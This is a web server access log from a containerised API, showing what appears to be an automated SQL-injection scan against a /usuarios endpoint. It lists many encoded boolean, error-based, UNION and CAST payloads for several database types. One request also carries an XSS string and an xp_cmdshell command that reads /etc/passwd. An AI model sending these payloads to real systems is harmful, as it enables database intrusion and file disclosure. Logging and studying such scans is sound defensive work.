api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios?OsgP=1192%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /9207 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%28%27..%22%29.%2C.. HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27gYrwgI%3C%27%22%3EumweEr HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F8891%3D6822%2F%2A%2A%2FAND%2F%2A%2A%2F%282669%3D2669 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F8425%3D8425%2F%2A%2A%2FAND%2F%2A%2A%2F%286902%3D6902 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F4592%3D6318 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F8425%3D8425 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9168%3D9846%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27KTFh%27%3D%27KTFh HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8425%3D8425%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27HGif%27%3D%27HGif HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F4003%3D4486%2F%2A%2A%2FAND%2F%2A%2A%2F%27JGTF%27%3D%27JGTF HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F8425%3D8425%2F%2A%2A%2FAND%2F%2A%2A%2F%27ONcu%27%3D%27ONcu HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F6410%3D8181--%2F%2A%2A%2FJwgG HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F8425%3D8425--%2F%2A%2A%2Ftomw HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288397%3D4176%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27usuarios%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4176%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3222%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282980%3D2980%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27usuarios%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7696%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3103%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281055%2CCONCAT%280x5c%2C0x7162787871%2C%28SELECT%2F%2A%2A%2F%28ELT%281055%3D1055%2C1%29%29%29%2C0x716b787171%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289120%3D9120 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281055%2CCONCAT%280x5c%2C0x7162787871%2C%28SELECT%2F%2A%2A%2F%28ELT%281055%3D1055%2C1%29%29%29%2C0x716b787171%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281055%2CCONCAT%280x5c%2C0x7162787871%2C%28SELECT%2F%2A%2A%2F%28ELT%281055%3D1055%2C1%29%29%29%2C0x716b787171%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27wYXX%27%3D%27wYXX HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281055%2CCONCAT%280x5c%2C0x7162787871%2C%28SELECT%2F%2A%2A%2F%28ELT%281055%3D1055%2C1%29%29%29%2C0x716b787171%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27IMNi%27%3D%27IMNi HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281055%2CCONCAT%280x5c%2C0x7162787871%2C%28SELECT%2F%2A%2A%2F%28ELT%281055%3D1055%2C1%29%29%29%2C0x716b787171%29%29--%2F%2A%2A%2FTDyX HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F4901%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284901%3D4901%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289963%3D9963 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F4901%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284901%3D4901%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4901%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284901%3D4901%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27yAVR%27%3D%27yAVR HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F4901%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284901%3D4901%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27MTWt%27%3D%27MTWt HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F4901%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284901%3D4901%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FDxed HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F6848%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286848%3D6848%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282886%3D2886 HTTP/1.1
